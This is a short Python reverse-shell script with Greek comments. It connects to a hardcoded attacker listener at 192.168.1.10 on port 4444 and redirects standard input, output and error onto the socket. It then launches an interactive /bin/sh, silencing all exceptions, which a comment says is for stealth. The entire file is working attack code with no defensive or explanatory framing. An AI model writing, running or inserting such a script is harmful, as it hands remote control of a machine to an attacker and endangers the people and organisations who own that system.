import socket
import subprocess
import os

def reverse_shell():
    host = "192.168.1.10"  # IP του επιτιθέμενου (listener)
    port = 4444            # Θύρα για σύνδεση

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        # Αντικατάσταση των file descriptors με αυτά της σύνδεσης
        os.dup2(s.fileno(), 0)  # stdin
        os.dup2(s.fileno(), 1)  # stdout
        os.dup2(s.fileno(), 2)  # stderr

        # Εκκίνηση shell
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        pass  # Σίγαση λαθών για stealth

reverse_shell()
